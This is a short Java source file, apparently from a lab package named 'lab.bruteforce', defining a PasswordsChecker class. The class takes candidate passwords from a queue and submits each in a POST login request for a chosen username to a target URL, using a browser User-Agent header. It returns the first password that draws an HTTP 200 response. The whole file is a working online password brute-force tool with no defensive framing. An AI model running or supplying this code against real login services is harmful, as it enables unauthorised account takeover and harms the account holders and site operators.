package lab.bruteforce;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.Callable;

/**
 * Created by anna on 29.11.14.
 */
public class PasswordsChecker implements Callable<String> {

    private static final int OK_RESPONSE = 200;

    private final BlockingQueue<String> passwordsQueue;
    private final String params;
    private final String urlStr;

    public PasswordsChecker(BlockingQueue<String> passwordsQueue, String userName, String urlStr) {
        this.passwordsQueue = passwordsQueue;
        this.params = "login=" +userName + "&password=";
        this.urlStr = urlStr;
    }

    @Override
    public String call() throws Exception {
        String password;
        while (!"STOP".equals(password = passwordsQueue.take())) {
            if (sendPOST(password)) {
                return password;
            }
        }
        return null;
    }

    private boolean sendPOST(String password) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

        String urlParams = params + password;

        connection.setDoOutput(true);
        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
        outputStream.writeBytes(urlParams);
        outputStream.flush();
        outputStream.close();

        return connection.getResponseCode() == OK_RESPONSE;
    }
}
